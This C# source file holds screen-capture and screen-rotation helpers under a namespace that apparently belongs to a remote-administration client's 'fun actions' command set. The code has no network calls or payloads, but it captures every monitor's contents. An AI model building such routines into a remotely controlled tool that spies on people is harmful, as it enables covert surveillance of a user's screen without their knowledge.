using System.Drawing;
using System.Windows.Forms;

namespace Orcus.Commands.FunActions
{
    internal class ImageUtilities
    {
        public static Bitmap TakeScreenshot()
        {
            var bmpScreenCapture = new Bitmap(SystemInformation.VirtualScreen.Width,
                SystemInformation.VirtualScreen.Height);
            using (var g = Graphics.FromImage(bmpScreenCapture))
            {
                g.CopyFromScreen(SystemInformation.VirtualScreen.X,
                    SystemInformation.VirtualScreen.Y,
                    0, 0,
                    bmpScreenCapture.Size,
                    CopyPixelOperation.SourceCopy);
            }
            return bmpScreenCapture;
        }

        public static Bitmap TakeFullScreenshot()
        {
            // Determine the size of the "virtual screen", which includes all monitors.
            int screenLeft = SystemInformation.VirtualScreen.Left;
            int screenTop = SystemInformation.VirtualScreen.Top;
            int screenWidth = SystemInformation.VirtualScreen.Width;
            int screenHeight = SystemInformation.VirtualScreen.Height;

            // Create a bitmap of the appropriate size to receive the screenshot.
            var bmp = new Bitmap(screenWidth, screenHeight);
            // Draw the screenshot into our bitmap.
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
            }
            return bmp;
        }

        public static Bitmap RotateScreenshotScreenByScreen(Bitmap image)
        {
            var newImage = new Bitmap(image.Width, image.Height);
            using (var g = Graphics.FromImage(newImage))
            {
                foreach (var screen in Screen.AllScreens)
                {
                    var bitmap = image.Clone(screen.Bounds, image.PixelFormat);
                    bitmap.RotateFlip(RotateFlipType.Rotate180FlipNone);
                    g.DrawImage(bitmap, new Point(screen.WorkingArea.X, screen.WorkingArea.Y));
                    bitmap.Dispose();
                }
            }
            return newImage;
        }
    }
}